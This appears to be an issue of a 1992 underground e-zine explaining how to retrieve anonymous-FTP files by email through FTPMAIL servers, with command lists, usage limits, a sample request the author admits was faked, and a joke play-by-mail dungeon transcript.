Last updated 01:02  9 Sep 1992

   Location: /pub/Mirrors/foobar/G-Files/Hacking4$
     FILE    rw-r--r--   36466  Jun 30 18:12   Internet-Mail-Dialouts

--

FTPMAIL

Anonymous FTP may be performed through the mail by various ftp-mail
servers. Send mail to one of the sites listed below:

        bitftp@pucc.princeton.edu
        ftpmail@decwrl.dec.com

These servers work exactly like the archie servers: you list the
commands in the body of your mail message.

Commands:

reply         set reply addr, since headers are usually
                        wrong

connect [HOST [USER [PASS]]]  You must give a "connect" command,
                        default host is the local ftpmail system,
                        default user is anonymous, default password
                        is your mail address.

ascii                   files grabbed are printable ascii

binary                  files grabbed are compressed, tar, both, or
                        executable binaries, etc.

chdir PLACE             "get" and "ls" commands are relative to PLACE
                        (only one CHDIR per ftpmail session, and it
                        executes before any LS/DIR/GETs)

compress                compress binaries using Lempel-Ziv encoding

compact                 compress binaries using Huffman encoding

uuencode                binary files will be mailed in uuencode
                        format

btoa                    binary files will be mailed in btoa format

chunksize SIZE          split files into SIZE-byte chunks
                        (def: 64000)

ls (or dir) PLACE       short (long) directory listing

get FILE                get a file and have it mailed to you
                        (max 10 GET's per ftpmail session)

quit                    terminate script, ignore rest of mail message
                        (use if you have a .signature or are a
                         VMSMAIL user)

Notes:

You should send complaints to an ftpmail-request address.  The
postmaster of the ftpmail site does not handle ftpmail problems and
you can save him or her the trouble of forwarding your complaints by
just mailing them to the right address. The address for the ftpmail
server sponsored by DEC is:

    ftpmail-request@uucp-gw-2.pa.dec.com

The "Subject:" of your request will be contained in the "Subject:" of
all of ftpmail's responses to you regarding that request.  You can
therefore use it to "tag" different requests if you have more than
one outstanding at any given time.

Binary files will not be compressed unless 'compress' or 'compact'
command is given; use this if possible. Note that many files are
already compressed.  If you use any of the binary-file qualifiers
(compress, compact, uuencode, btoa) without setting 'binary' first,
your session will abort in error.

Binary files will always be formatted into printable ASCII with
"btoa" or "uuencode" (default is "btoa").  If you don't use the
"binary" command, ftpmail will cheerfully try to mail you the binary
data, which will absolutely, positively fail.

All retrieved files will be split into chunks and mailed.  The size
of the chunk is 50000 characters unless you change it with the
"chunksize" command.  CompuServe users will need to set this to
49000.

If you ask for more than 10 files in a session, you will receive an
error message and your entire request will be rejected.

There is no way to ask for only certain parts of a file to be sent.
If you receive output from ftpmail that seems to be missing some
parts, it is likely that some mailer between here and there has
dropped them.  You can try your request again, but chances are fairly
good that if it is dropped once it will be dropped every time.

There is no way to find out the status of things in the queue.

There is no way to delete a request, so be sure that it has failed
before you resubmit one or you will receive multiple copies of
anything you have requested.

There is no way to specify that your request should be tried only
during certain hours of the day.  If you need a file from a time-
restricted FTP server, you probably cannot get it via ftpmail.

Note that the "reply" or "answer" command in your mailer will not
work for any mail you receive from FTPMAIL.  To send requests to
FTPMAIL, send an original mail message, not a reply.

--

Examples:

-> connect to the local ftpmail system and get a root directory
   listing:
        connect
        ls
        quit

-> connect to the local ftpmail system and get the README.ftp file
   that is located in the root directory:
        connect
        get README.ftp
        quit

-> connect to local ftpmail system and get the gnuemacs sources:
        connect
        binary
        uuencode
        chdir /pub/GNU
        get emacs-18.58.tar.Z
        quit

(Note: I do not recommend getting file this big using this method,
 but if its all ya got, its all ya got)

-> connect to ftp.uu.net as anonymous and get a root directory list:
        connect ftp.uu.net
        dir
        quit


You should expect the results to be mailed to you within a day or so.

If all goes well you will get a message back like the one below:

--

We processed the following input from your mail message:

  reply underg.ucf.org!rr
  connect ftp.foobar.org
  chdir /pub/G-Files/Hacking4$
  get Internet-Mail-Dialouts
  quit

We have entered the following request into our job queue
as job number 716623942.5012:

  reply underg.ucf.org!rr
  connect ftp.foobar.org anonymous ftpmail/underg.ucf.org!rr
  chdir /pub/G-Files/Hacking4$
  get Internet-Mail-Dialouts uncompressed
  quit

There are 841 jobs ahead of this one in our queue.

[Misc notes deleted, or reproduced above...]

  -- Ftpmail Submission Transcript --
<<< reply underg.ucf.org!rr
>>> OK, will reply to 
<<< connect ftp.foobar.org
>>> Connect to ftp.foobar.org as anonymous ftpmail/underg.ucf.org!rr
<<< chdir /pub/G-Files/Hacking4$
>>> Will chdir to  before I do anything else
<<< get Internet-Mail-Dialouts
>>> get Internet-Mail-Dialouts uncompressed
<<< quit
>>> Done - rest of message will be ignored
>>> checking security of host `ftp.foobar.org'
>>> host `ftp.foobar.org' is ok
  -- End Of Ftpmail Transcript --
--

   And then shortly thereafter you will find the file in your
mailbox. Note: Do not attempt this example at home. It will not work,
as this example was totally faked.


POSTSCRIPT

   You know what would be great? Multi-user play by e-mail games. A
transcript might look like this:

  -- MailDungeon Submission Transcript --
<<< reply underg.ucf.org!rr
>>> OK, will reply to 
<<< character Dirk-Daring
>>> OK, character to be used: Dirk-Daring
<<< go north
>>> OK, Dirk-Daring went north
<<< look around
>>> You see a large 30X40 room. It is dark and musty. Boxes are
>>> all around. It is damp, and you smell the stench of vermin.
>>> Others Present:
>>> EVIL WIZARD Haldor
<<< fight monsters
>>> No monsters present
<<< fight enemies
>>> You surprise Haldor
>>> You swing short sword
>>> You kill Haldor
>>> Sending mail to Haldor's owner. Subject: Bad News...
<<< get treasure
>>> OK, get treasure.
>>> You find small sack with 20 gold coins
<<< quit
>>> Done - rest of message will be ignored
  -- End Of MailDungeon Transcript --

---------------------------------------------------------------------
#####################################################################
---------------------------------------------------------------------

   Well that is all for this issue. Please send your contributions.
I print just about anything! Especially looking for a C++ tutorial
series, and also guided tours of underground bulletin boards.

--

--
dfp-req@underg.ucf.org (dfp-req)


